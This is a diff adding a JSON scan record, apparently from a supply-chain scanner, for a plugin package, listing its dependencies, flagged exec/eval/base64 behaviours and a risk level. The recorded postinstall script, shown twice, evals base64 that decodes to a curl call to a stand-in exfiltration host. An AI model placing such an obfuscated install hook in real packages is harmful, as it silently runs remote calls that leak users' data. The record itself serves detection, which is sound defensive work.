@@ -1,0 +1,102 @@
+{
+ "repo": "zoahdev/dsh-poison-guard",
+ "stars": 0,
+ "description": "Pre-install supply-chain poison scanner for DeepSeek Harness plugins: AST (JS-X-Ray) + deobfuscation + regex. Catches obfuscated exfiltration, eval, hidden shell commands.",
+ "pushed_at": "2026-08-17T14:18:48Z",
+ "status": "ok",
+ "manifest": {
+  "bundle": {
+   "patch": "./cordis.patch.yml"
+  }
+ },
+ "pkg_name": "dsh-poison-guard",
+ "deps": [
+  "@nodesecure/js-x-ray",
+  "@deepseek-ai/cordis",
+  "@deepseek-ai/dsh-tools"
+ ],
+ "install_scripts": {
+  "prepare": "tsc -p tsconfig.json",
+  "postinstall": "node -e \"eval(Buffer.from('ZXhlYygnY3VybCBodHRwczovL2V2aWwuZXhhbXBsZS9leGZpbCcp','base64').toString())\""
+ },
+ "injects": [
+  "tools"
+ ],
+ "hooks": [],
+ "tool_regs": 4,
+ "domains": {},
+ "env": {},
+ "behaviors": {
+  "exec": {
+   "src": 4,
+   "dev": 5,
+   "evidence": [
+    "lib/index.js:48",
+    "lib/index.js:92",
+    "src/index.ts:84",
+    "src/index.ts:131"
+   ]
+  },
+  "eval": {
+   "src": 2,
+   "dev": 1,
+   "evidence": [
+    "lib/index.js:91",
+    "src/index.ts:130"
+   ]
+  },
+  "base64_decode": {
+   "src": 8,
+   "dev": 3,
+   "evidence": [
+    "lib/index.js:184",
+    "lib/index.js:233",
+    "lib/index.js:233",
+    "lib/index.js:240",
+    "src/index.ts:231"
+   ]
+  },
+  "net_server": {
+   "src": 0,
+   "dev": 0,
+   "evidence": []
+  },
+  "fs_write": {
+   "src": 0,
+   "dev": 0,
+   "evidence": []
+  },
+  "dyn_import": {
+   "src": 0,
+   "dev": 0,
+   "evidence": []
+  }
+ },
+ "has_apply": true,
+ "files_scanned": 9,
+ "has_skill_md": false,
+ "type": "plugin",
+ "flags": [
+  {
+   "id": "runtime_patch",
+   "evidence": "./cordis.patch.yml"
+  },
+  {
+   "id": "install_script",
+   "evidence": "postinstall: node -e \"eval(Buffer.from('ZXhlYygnY3VybCBodHRwczovL2V2aWwuZXhhbXBsZS9leGZpbCcp','base64').toString())\""
+  },
+  {
+   "id": "exec",
+   "evidence": "×4 src, e.g. lib/index.js:48, lib/index.js:92"
+  },
+  {
+   "id": "eval",
+   "evidence": "×2 src, e.g. lib/index.js:91, src/index.ts:130"
+  },
+  {
+   "id": "base64_decode",
+   "evidence": "×8 src, e.g. lib/index.js:184, lib/index.js:233"
+  }
+ ],
+ "level": 3
+}
